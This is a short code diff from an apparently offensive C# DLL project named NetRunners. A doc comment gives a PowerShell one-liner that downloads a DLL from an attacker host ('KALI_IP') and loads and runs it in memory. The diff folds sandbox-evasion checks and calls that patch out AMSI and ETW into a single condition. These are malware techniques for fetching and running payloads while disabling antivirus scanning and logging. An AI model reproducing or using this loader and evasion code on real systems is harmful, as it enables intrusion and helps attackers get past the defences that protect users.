@@ -14,16 +14,10 @@ namespace NetRunners.Dll
         /// You can run this compiled managed DLL using this powershell one-liner:
         /// [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://KALI_IP/NetRunnersDll.dll')).GetType('NetRunnersDll.Class1').GetMethod('Run').Invoke(0, $null)
         /// </example>
-
         public static void Run()
         {
             // call heuristic functions
-            if ((!Sleep()) || (!NonEmulated()))
-            {
-                return;
-            }
-            // call patchers
-            if ((!PatchEtw()) || (!PatchAmsi()))
+            if ((!Sleep()) || (!NonEmulated()) || (!PatchEtw()) || (!PatchAmsi()))
                 return;
 
             // Uncomment your choice
